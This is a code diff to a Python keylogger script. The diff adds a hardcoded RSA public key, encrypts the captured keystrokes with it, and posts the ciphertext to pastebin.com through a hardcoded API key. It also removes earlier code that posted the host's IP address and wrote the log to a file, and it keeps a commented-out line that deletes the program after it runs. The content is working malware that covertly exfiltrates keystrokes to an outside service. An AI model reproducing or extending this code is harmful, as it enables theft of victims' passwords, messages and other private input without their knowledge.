@@ -32,16 +32,25 @@ def main():
     dev_key = '475b38cdfbba7a92d8bde6c56adfb241'
     pastebin_url = "http://pastebin.com/api/api_post.php"
 
-    hostname = socket.gethostname()
-    ip = socket.gethostbyname(hostname)
+    pubkey = b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95UUVFbx17//PAKDAt2U' \
+             b'\nX3eRxdobjR3GWs6KNLWKfkgJRjux8y3eoYZpugZHYyDptN0VjbxjrkOWhubDVeCv' \
+             b'\nCHSBI7FUzf62bc5048zaifHFLQFselSD6zonc2p9w4oOjqmZj3POXEmB//mOXNFi' \
+             b'\n8b0o5HYQWB084H3MgtijZBCMVLikbLrGYmpbUZatiHb48f5w2mNeUihDK9THsvf+\n3pk2Kp6e3VsMgaAtHztvt7NVKyPphtcYS' \
+             b'/UTu1W/qIvTPWr2/utwsffo78o4e+SJ\n+zbMqbgAJieIv9cFFfebr3QNxQ4aDz5tO8YKLLfWqQBN9aoxUM2I8gBVbl378Vnk' \
+             b'\nIwIDAQAB\n-----END PUBLIC KEY----- '
 
-    ip_data = {'api_dev_key': dev_key,
-               'api_option': 'paste',
-               'api_paste_code': str(ip),
-               # 'api_paste_private': 0,
-               'api_paste_name': 'url_test'}
+    # Code for posting IP to pastebin (not needed)
+    # hostname = socket.gethostname()
+    # ip = socket.gethostbyname(hostname)
+    #
+    # ip_data = {'api_dev_key': dev_key,
+    #            'api_option': 'paste',
+    #            'api_paste_code': str(ip),
+    #            # 'api_paste_private': 0,
+    #            'api_paste_name': 'url_test'}
 
-    key_url = requests.post(url=pastebin_url, data=ip_data)
+    # ip_url = requests.post(url=pastebin_url, data=ip_data)
+    # print(ip_url.text)  # print out URL of paste
 
     log_dir = "./"
 
@@ -56,41 +65,32 @@ def main():
         com = sock.recv(20).decode()
         print(com)
 
-    fi = open(log_dir + "out.txt", "w")
+    # Code for writing keylogger out to file for testing
+    # fi = open(log_dir + "out.txt", "w")
     outstring = ''
     for i in output:
-        b = i.replace("\'", '')
+        b = i.replace("\'", '')  # convert keylogger data to readable string
         print(b)
-        fi.write(b)
+        # fi.write(b)
         outstring = outstring + b
-    fi.close()
+    # fi.close()
 
+    # encode output string in RSA (uses hardcoded public key at start of main)
+    key = RSA.importKey(pubkey)
+    cipher = PKCS1_OAEP.new(key)
+    outdata = outstring.encode()
+    ciphertext = cipher.encrypt(outdata)
+
+    # Paste keylogger data on pastebin after encrypting
     key_data = {'api_dev_key': dev_key,
                 'api_option': 'paste',
-                'api_paste_code': outstring,
+                'api_paste_code': ciphertext,
                 'api_paste_private': 0,
                 'api_paste_name': 'key_test'}
     key_url = requests.post(url=pastebin_url, data=key_data)
-    print(ip_url.text)
-    print(key_url.text)
-    # remove(argv[0])
 
-    # encode output string in RSA (assumes key is in directory and stored as receiver.pem)
-    data = outstring.encode("utf-8")
-    file_out = open("encrypted_data_key.bin", "wb")  # writes to file for now
-
-    recipient_key = RSA.import_key(open("receiver.pem").read())
-    session_key = get_random_bytes(16)
-
-    # Encrypt the session key with the public RSA key
-    cipher_rsa = PKCS1_OAEP.new(recipient_key)
-    enc_session_key = cipher_rsa.encrypt(session_key)
-
-    # Encrypt the data with the AES session key
-    cipher_aes = AES.new(session_key, AES.MODE_EAX)
-    ciphertext, tag = cipher_aes.encrypt_and_digest(data)
-    [file_out.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext)]
-    file_out.close()
+    print(key_url.text)  # print out url of paste
+    # remove(argv[0])  # delete program after running
 
 
 if __name__ == "__main__":
